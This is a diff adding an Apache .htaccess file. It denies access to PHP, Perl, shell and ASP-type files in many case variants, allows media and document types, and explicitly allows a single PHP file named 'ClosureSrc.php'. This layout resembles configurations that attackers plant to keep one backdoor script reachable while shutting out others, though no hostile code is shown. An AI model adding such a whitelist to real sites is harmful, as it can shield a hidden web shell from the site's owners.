@@ -1,0 +1,88 @@
+<Files *.ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.pe*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.Pe*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.pl*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.PL*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.pE*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.pL*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.Ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.pH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.PH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.sh*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.Sh*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.sH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.SH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.AS*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.As*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.aS*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.as*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<FilesMatch "\.(jpg|jpeg|png|gif|svg|bmp|ico|webp|heic|docx)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(mp4|webm|avi|mov|wmv|mp3|wav|ogv|ogg)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(pdf|doc|docx|xls|xlsx|zip|rar|tar|gz|ppt|pptx|csv|)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "^(ClosureSrc.php)$"> 
+Order Allow,Deny 
+Allow from all 
+</FilesMatch>
